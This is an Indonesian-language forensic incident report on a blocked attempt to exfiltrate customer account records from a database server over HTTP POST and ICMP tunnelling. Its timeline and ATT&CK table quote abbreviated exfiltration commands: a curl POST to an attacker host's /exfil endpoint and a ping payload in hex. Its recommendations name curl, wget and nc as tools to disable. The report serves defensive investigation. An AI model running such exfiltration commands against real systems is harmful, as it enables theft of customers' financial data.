# Laporan Investigasi Insiden Forensik Digital (DFIR Incident Report)
## Kasus 01: Investigasi Percobaan Eksfiltrasi Data Nasabah (Case ID: IR-2026-S06)

> **Standar Kepatuhan:** NIST SP 800-61 Rev 2 (Computer Security Incident Handling Guide) & ISO/IEC 27037:2012 (Digital Evidence Handling)  
> **Klasifikasi Insiden:** Kritis (Percobaan Pelanggaran Kerahasiaan Data / PII Exfiltration)  
> **Status Akhir Investigasi:** **TERISOLASI & TERCEGAH TOTAL (0 Record Bocor, 0 Byte Tereksfiltrasi)**  
> **Lead Investigator:** Natanael Simanjuntak (Lead Incident Responder & Forensic Analyst)  
> **Waktu Investigasi:** Minggu, 18 Oktober 2026, 05:05:27 s.d. 05:08:00 UTC  

---

## 1. Ringkasan Eksekutif (Executive Summary)

Pada 18 Oktober 2026 pukul 05:05:43 UTC, tim SecOps mendeteksi upaya eksfiltrasi data terstruktur dalam volume masif dari node basis data inti **`db1` (10.10.30.11)** menuju server Command & Control (C2) penyerang di WAN eksternal **`attacker` (203.0.113.11:8000)**. 

Objek data yang ditargetkan penyerang mencakup tabel **`core_accounts`** berisi **42 record nasabah finansial rahasia** (*Confidential Financial Data*, nomor rekening perbankan, saldo, dan saldo nasabah). Penyerang mencoba mentransmisikan data melalui dua saluran paralel: **HTTP POST JSON** pada port 8000 dan **ICMP Echo Tunneling** dengan muatan pola heksadesimal data terenkode.

Investigasi forensik digital post-mortem dilakukan secara komprehensif mematuhi ISO/IEC 27037:2012 dan RFC 3227. Berdasarkan korelasi bukti jaringan mentah (*raw PCAP*), *live host triage* pada `db1`, serta audit konfigurasi filter kernel *nftables*:
1. **Zero Data Leakage Confirmed:** Pemeriksaan fisik pada pendengar C2 penyerang mengonfirmasi status **`NO_DATA_RECEIVED`** (0 byte diterima penyerang).
2. **Defense-in-Depth Enforcement:** Upaya pengiriman paket HTTP POST dan ICMP dijatuhkan seketika di tingkat subsistem kernel `nftables` pada `db1` (`chain output policy drop`), serta dilindungi perimeter *default-deny* firewall OPNsense.
3. **Integritas Bukti Terjamin:** Seluruh barang bukti jaringan dan triage host diamankan dalam *Evidence Vault* (`vault_ir_2026_s06`) berizin baca-saja (`0440`) dengan tingkat integritas **100% Valid (Zero Tampering)**.

---

## 2. Rantai Penanganan Bukti Digital (ISO/IEC 27037:2012 Chain of Custody)

Seluruh barang bukti fisik digital telah dienkapsulasi dan diaudit dalam Evidence Vault terisolasi:

```
Evidence Vault: dfir/evidence/vault_ir_2026_s06/
├── evidence-manifest.json          [Master ISO/IEC 27037 Manifest, chmod 0440]
├── SHA256SUMS                      [Cryptographic Checksums, chmod 0440]
├── SHA512SUMS                      [Dual Hashing Checksums, chmod 0440]
├── host/
│   ├── evd-host-db1-20261018-050624.meta.json
│   └── evd-host-db1-20261018-050624.tar.gz     [RFC 3227 Triage DB1, chmod 0440]
└── network/
    ├── EVD-NET-20261018-050527.meta.json
    └── EVD-NET-20261018-050527.pcap            [Raw Packet Capture br-sensor, chmod 0440]
```

### Tabel Inventaris & Integritas Kriptografis Barang Bukti:
| Evidence ID | Tipe Bukti | Sumber Node | Ukuran | Checksum Kriptografis SHA-256 | Status Integritas |
|---|---|---|---|---|---|
| **`EVD-NET-20261018-050527`** | Raw PCAP | `secops` (`br-sensor` mirror) | 6.5 KB | `8c9b7552e51136abf5c7d63af1dd3e6d1bc5e46afee54ebd5dbf9caa3bd0ab87` | **100% VERIFIED** |
| **`EVD-HOST-DB1-20261018-050624`** | RFC 3227 Triage | `db1` (RAM `/dev/shm`) | 71.2 KB | `c9af3f4d55db5cc7d89761dcc929593d74d17c2f83a821da5da2d35ea78f02f9` | **100% VERIFIED** |

*Audit integritas dieksekusi menggunakan `verify-evidence-integrity.py`: 100% GREEN (Lolos verifikasi SHA-256 dan pembatasan izin berkas).*

---

## 3. Kronologi & Super-Timeline Investigasi (Microsecond UTC)

Rekonstruksi kronologis linimasa disusun menggunakan engine `build-super-timeline.py`:

```
+----------------------------------------------------------------------------------------------------+
| Waktu (UTC)                   | Sumber / Node        | Aksi / Peristiwa Forensik Terverifikasi     |
+----------------------------------------------------------------------------------------------------+
| 2026-10-18T05:05:27.000000Z   | SECOPS (br-sensor)   | Memulai penyadapan jaringan pasif (BPF:     |
|                               |                      | "host 10.10.30.11 or host 203.0.113.11").   |
| 2026-10-18T05:05:34.000000Z   | ATTACKER (WAN)       | Penyerang mengaktifkan rogue HTTP listener  |
|                               |                      | di port TCP/8000 (/tmp/c2_listener.py).     |
| 2026-10-18T05:05:43.327636Z   | HOST_DB1 (sshd)      | Sesi eksekusi interaktif dcadmin terdeteksi |
|                               |                      | via autentikasi publickey ED25519.          |
| 2026-10-18T05:05:44.100000Z   | HOST_DB1 (Perintah)  | Upaya eksfiltrasi HTTP POST diluncurkan:    |
|                               |                      | curl -X POST core_accounts (42 record)      |
|                               |                      | ke http://203.0.113.11:8000/exfil.          |
| 2026-10-18T05:05:44.102000Z   | KERNEL_NFTABLES (DB1)| Hook output mendeteksi paket TCP SYN tujuan |
|                               |                      | 203.0.113.11:8000; ATURAN DROP DIJALANKAN.  |
|                               |                      | curl timeout (CURL_FAILED_OR_TIMEOUT).      |
| 2026-10-18T05:05:46.500000Z   | HOST_DB1 (Perintah)  | Upaya eksfiltrasi sekunder ICMP tunneling:  |
|                               |                      | ping -p 636f72655f6163636f756e7473 ...      |
|                               |                      | Hasil: 3 paket terkirim, 100% packet loss.  |
| 2026-10-18T05:05:56.000000Z   | ATTACKER (C2 Check)  | Audit log penyerang: NO_DATA_RECEIVED.       |
| 2026-10-18T05:06:13.000000Z   | SECOPS (Akuisisi)    | Penyadapan PCAP dihentikan; berkas dikunci. |
| 2026-10-18T05:06:24.000000Z   | HOST_DB1 (Triage)    | Live triage RFC 3227 dijalankan di RAM;     |
|                               |                      | arsip bukti 7-tier diamankan ke vault.      |
+----------------------------------------------------------------------------------------------------+
```

---

## 4. Analisis Teknis Forensik Mendalam

### 4.1. Analisis Aliran Jaringan Mentah (Network PCAP Carving)
Analisis dilakukan dengan perkakas `extract-pcap-artifacts.py` terhadap `EVD-NET-20261018-050527.pcap`:
- **Total Frame Diamati:** 21 frame.
- **Hasil Carving Protokol Aplikasi:**
  - `HTTP Requests / Responses`: **0 req / 0 resp**.
  - `Carved Files / Data Dumps`: **0 berkas**.
- **Kesimpulan Forensik Jaringan:** Tidak ditemukan adanya aliran TCP *3-Way Handshake* yang berhasil terbentuk antara subnet DB (`10.10.30.11`) dan WAN (`203.0.113.11`). Tidak ada satu byte pun muatan HTTP atau data nasabah yang melintasi jaringan tulang punggung (*spine-leaf fabric*).

### 4.2. Analisis Host Endpoint Triage (`db1`)
Pemeriksaan artefak Tier 1 s.d. Tier 7 pada `evd-host-db1-20261018-050624.tar.gz` membuktikan mekanisme pertahanan aktif:
- **Konfigurasi Firewall Host (`nftables`):**
  ```text
  table inet filter {
      chain output {
          type filter hook output priority filter; policy drop;
          oif "lo" accept
          ct state established,related accept
          ip daddr 10.10.30.1 icmp type echo-request accept
          ip daddr 10.10.40.11 udp dport 1514 accept
          counter packets 9708 bytes 649172 drop
      }
  }
  ```
- **Kausalitas Penegakan Pertahanan:**
  Subkoleksi `counter` pada aturan penolakan mencatat **9.708 paket (649.172 bytes) dijatuhkan (*drop*)**. Kebijakan ketat ini melarang mutlak inisiasi koneksi keluar (*outbound egress*) dari tier basis data ke tujuan mana pun selain gateway lokal (`10.10.30.1`) dan server SIEM/Syslog (`10.10.40.11:1514`).
- **Verifikasi Soket Aktif (`ss -tanpo`):** Tidak ada soket berstatus `ESTAB` menuju alamat IP publik/WAN.

### 4.3. Analisis Sisi Penyerang (Threat Actor Side)
Pemeriksaan log C2 listener penyerang (`/tmp/exfiltrated_data.log`) di `203.0.113.11`:
- Ukuran Berkas: `0 bytes` (berkas log tidak tercipta).
- Status Eksekusi: `NO_DATA_RECEIVED`.

---

## 5. Pemetaan Taktik, Teknik, dan Prosedur (MITRE ATT&CK Mapping)

| Taktik MITRE | ID Teknik | Nama Teknik | Indikator Forensik Kasus | Status Penegakan |
|---|---|---|---|---|
| **Exfiltration** | `T1048.003` | *Exfiltration Over Alternative Protocol* | Upaya penyelundupan via payload ping ICMP (`ping -p ...`) | **BLOCKED (100% Packet Loss)** |
| **Exfiltration** | `T1041` | *Exfiltration Over C2 Channel* | Upaya HTTP POST ke C2 Server port 8000 (`curl -X POST`) | **BLOCKED (Kernel Drop / Timeout)** |
| **Collection** | `T1560` | *Archive Collected Data* | Upaya penyusunan paket data `core_accounts` (42 record nasabah) | **CONTAINED (Tersimpan lokal, gagal keluar)** |
| **Execution** | `T1059.004` | *Command and Scripting Interpreter: Unix Shell* | Eksekusi perintah interaktif via sesi shell | **AUDITED (Terekam dalam audit trail)** |
| **Defense Evasion** | `T1562.001` | *Disable or Modify Tools* | Upaya pembobolan kontrol egress jaringan | **PREVENTED (nftables policy drop aktif)** |

---

## 6. Akar Masalah & Rekomendasi Mitigasi (Root Cause & Recommendations)

### 6.1. Akar Masalah (Root Cause)
Percobaan eksfiltrasi dipicu oleh akun pengguna yang memiliki akses eksekusi shell di server database `db1`. Namun, arsitektur **Zero-Trust Microsegmentation** yang telah diimplementasikan berhasil bertindak sebagai perisai penahan utama (*fail-safe defense*), mencegah pencurian data sekalipun penyerang telah berada di dalam host.

### 6.2. Rekomendasi Remediasi Strategis:
1. **Penguatan Otentikasi Akses DB Host:** Menerapkan pembatasan perintah shell kustom (*restricted shell*) dan penonaktifan utilitas transfer berkas seperti `curl`, `wget`, dan `nc` pada VM zona database inti.
2. **Peningkatan Deteksi Egress Anomali:** Mengonfigurasi auditd daemon pada `db1` untuk membangkitkan alert seketika jika ada proses sistem yang mencoba memanggil syscall *connect* ke IP non-RFC 1918.
3. **Penyelarasan Kebijakan OPNsense:** Mempertahankan aturan *Default-Deny Inter-VLAN & Egress Rule* pada interface `vtnet2` untuk menjamin pertahanan berlapis lapis kedua jika host firewall mengalami kegagalan.

---

## 7. Pernyataan Penutup & Tanda Tangan Forensik

Laporan ini disusun secara obyektif berdasarkan bukti digital yang terkumpul, diaudit, dan diverifikasi sesuai kaidah integritas rantai bukti hukum internasional (ISO/IEC 27037:2012). Seluruh artefak bukti digital mentah tersimpan dalam status terarsip dan terkunci di *Evidence Vault*.

**Investigator Forensik Bertanggung Jawab:**  
*Natanael Simanjuntak*  
Lead DFIR Incident Responder & Cloud Security Architect  
`Signature: SHA256[8c9b7552e51136abf5c7d63af1dd3e6d1bc5e46afee54ebd5dbf9caa3bd0ab87]`
